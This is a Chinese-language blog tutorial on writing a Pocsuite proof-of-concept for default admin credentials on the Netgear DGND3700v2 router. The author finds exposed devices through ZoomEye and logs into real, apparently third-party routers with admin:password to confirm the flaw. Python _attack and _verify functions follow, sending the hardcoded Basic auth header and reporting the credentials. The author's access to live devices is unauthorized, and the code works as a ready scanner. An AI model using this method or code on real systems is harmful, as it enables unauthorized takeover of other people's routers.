懒

  

认识我的人都知道我“懒”，啥都不会，比如？first不会写代码，Second不懂优雅写PoC，Third还有很多很多，我就不想告诉大家有多懒了，但是我既然懒了我就要整点啥东西出来，让它代替我的勤奋。比如自动化去搜索检测漏洞。曾经我多么想搞工控漏洞，but我不会啊，被逼无赖之下，只能看呀看呀看……

 在Seebug中找准要写的那个漏洞PoC作为目标，利用zoomeye去搜索存在漏洞的网站，然后在手工测试是否存在，然后看下它的一些信息，好啦不透露太多了。往下看吧Q\_Q

  

目标：

·        漏洞编号：

·        SSV-91285

 

利用这已有的漏洞详情去搜索目标，直接在zoomeye上搜索：

# netgear DGND3700v2

看下会不会有结果

![](../Images/ae659d980b16fd23857ba61c94a620db.png)  
发现存在十多个该组件的IP地址，那么翻墙逐个打开这些IP看下是否存在漏洞。

![](../Images/ee7bfcc18e41ad0fe76a9c9e8ed27f7d.png)  
发现了某IP存在该漏洞，未登录前F12

![](../Images/798b51f9cdcba598c865528138d8b9ef.png)

把账号密码输入后，可见它是GET请求的，然后在header里面有一个Authorization的信息，可见有base字眼，然后去解密看下，得知为admin:password，也就是登陆的账号密码![](../Images/3750834515ab2efa8edb74e7b6252075.png)  

  

开始写Poc了

![](../Images/bbdcd0ed83b1482353ac3979fd199b4c.png)  
点击写PoC就会完善前面的一些信息，然后我们把前面的信息复制出来。

#!/usr/bin/env python

\# coding: utf-8

from pocsuite.api.request import req

from pocsuite.api.poc import register

from pocsuite.api.poc import Output, POCBase

  

  

class TestPOC(POCBase):

    vulID = '91285'  # ssvid

    version = '1.0'

    author = \['xxxx'\]

    vulDate = ''

    createDate = '2016-04-23'

    updateDate = '2016-04-23'

    references = \['http://www.seebug.org/vuldb/ssvid-91285'\]

    name = 'netgear  DGND3700v2 管理后台默认口令'

    appPowerLink = 'http://www.netgear.com.cn/home/products/networking/wifi-routers/'

    appName = 'Netgear router'

    appVersion = ''

    vulType = 'Weak Password'

    desc = '''

    '''

    samples = \[''\]

前面信息已经写好了，那么后面验证步骤该如何写呢？首先我们要让程序知道，先前登陆的步骤，写入账号密码，跟判断header刚刚提到的Authorization，还要判断是否返回200的状态跟正确能让它登陆的话要验证一些特征

    def \_attack(self):

        result = {}

        header = {

            'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ='

        }

        res = req.get(self.url, headers=header)

        if res.status\_code == 200 and 'NETGEAR Router DGND3700v2' in res.content:

            result\['AdminInfo'\] = {}

            result\['AdminInfo'\]\['Username'\] = 'admin'

            result\['AdminInfo'\]\['Password'\] = 'password'

那么上面这几行代码就已经实现了那个功能了。那么当然，这个是attack的代码，那么下面我们还要写verify的代码。

  

verify的代码其实跟attack的也差不多

    def \_verify(self):

        result = {}

        header = {

            'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ='

        }

        res = req.get(self.url, headers=header)

        if res.status\_code == 200 and 'NETGEAR Router DGND3700v2' in res.content:

            result\['VerifyInfo'\] = {}

            result\['VerifyInfo'\]\['URL'\] = self.url

  

        return self.parse\_output(result)

主要是验证完了Authorization、状态的信息之后  

            result\['VerifyInfo'\] = {}

            result\['VerifyInfo'\]\['URL'\] = self.url

  

        return self.parse\_output(result)

这三行代码的作用就是result是字典类型，相关键和值用来表示PoC验证信息，返回当前类的输出结果的方法 。几个字概括就是“用来输出验证结果 ”
